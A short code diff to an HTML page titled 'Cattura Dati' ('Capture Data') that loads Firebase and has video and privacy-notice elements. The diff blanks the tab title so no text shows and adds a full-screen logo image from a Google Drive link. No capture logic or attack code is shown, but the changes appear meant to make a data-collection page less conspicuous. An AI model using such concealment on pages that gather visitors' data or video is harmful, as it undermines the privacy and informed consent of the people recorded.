@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cattura Dati</title>
+    <title></title> <!-- Titolo vuoto per evitare testo nella scheda -->
     <!-- Includi Firebase (versione modulare) -->
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.4/firebase-app.js';
@@ -49,6 +49,10 @@
             background-color: #000;
             overflow: hidden;
         }
+        #logo {
+            max-width: 100%;
+            max-height: 100vh;
+        }
         #video {
             max-width: 100%;
             border: 1px solid #ccc;
@@ -63,6 +67,7 @@
     </style>
 </head>
 <body>
+    <img id="logo" src="https://drive.google.com/uc?export=download&id=1-N96wQuv6rYcC-k2QDqRGUA6_L9LNk8K" alt="Logo Cattura">
     <div id="content"></div>
     <p id="privacy-notice"></p>
     <div id="debug"></div>
